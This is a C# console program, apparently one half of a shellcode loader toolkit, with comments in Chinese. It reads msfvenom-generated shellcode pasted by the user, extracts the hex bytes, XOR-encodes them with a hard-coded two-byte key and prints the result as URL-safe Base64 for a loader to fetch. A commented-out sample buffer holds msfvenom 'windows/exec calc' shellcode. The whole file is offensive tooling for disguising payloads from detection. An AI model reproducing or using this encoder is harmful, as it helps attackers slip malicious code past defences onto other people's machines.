﻿using System;
using System.Text.RegularExpressions;

namespace enloader
{
    class Program
    {
        static void Main(string[] args)
        {
            // 获取命令行输入的shellcode
            // 格式 msfvenom -p windows/exec cmd=calc -f csharp
            //byte[] buf = new byte[189] {
            //0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
            //0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
            //0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
            //0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
            //0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
            //0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
            //0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
            //0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
            //0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
            //0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
            //0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
            //0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
            //0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00 };

            Console.WriteLine("Input csharp shellcode (Ctrl + Enter): ");
            string sb = string.Empty;
            int lineNum = 1;

            for (ConsoleKeyInfo ckInfo = Console.ReadKey(); ckInfo.Key != ConsoleKey.Enter || ckInfo.Modifiers != ConsoleModifiers.Control; ckInfo = Console.ReadKey())
            {
                if (ckInfo.Key == ConsoleKey.Enter)
                {
                    sb += "\r\n";
                    Console.SetCursorPosition(0, ++lineNum);
                }
                else
                {
                    sb += ckInfo.KeyChar;
                }
            }
            sb += "\r\n";


            // 处理输入的字符串以拿到shellcode字符串
            string[] arr = sb.ToString().Split(Environment.NewLine.ToCharArray());
            string shellcodeStr = string.Empty;
            foreach (var item in arr)
            {
                string pattern = @"(0x\w\w)";
                foreach (Match match in Regex.Matches(item, pattern))
                    shellcodeStr += match.Value + ',';
            }
            Console.Clear();
            Console.WriteLine("Your shellcode is:");
            Console.WriteLine(shellcodeStr + "\n");

            // 处理shellcode字符串以拿到shellcode byte数组
            string[] shellcodeArr = shellcodeStr.TrimEnd(',').Split(',');
            byte[] shellcode = new byte[shellcodeArr.Length];

            for (int i = 0; i < shellcodeArr.Length; i++)
            {
                shellcode[i] = (byte)Convert.ToInt32(shellcodeArr[i], 16);
            }


            // 解决url编码问题
            string payload = Convert.ToBase64String(xor(shellcode)).TrimEnd('=').Replace('+', '-').Replace('/', '_');
            Console.WriteLine("Your payload is:");
            Console.WriteLine(payload);
            Console.ReadKey();
        }
        public static byte[] xor(byte[] input)
        {
            char[] key = { 'Y', '4', };
            byte[] output = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                output[i] = (byte)(input[i] ^ key[i % key.Length]);
            }
            return output;
        }
    }
}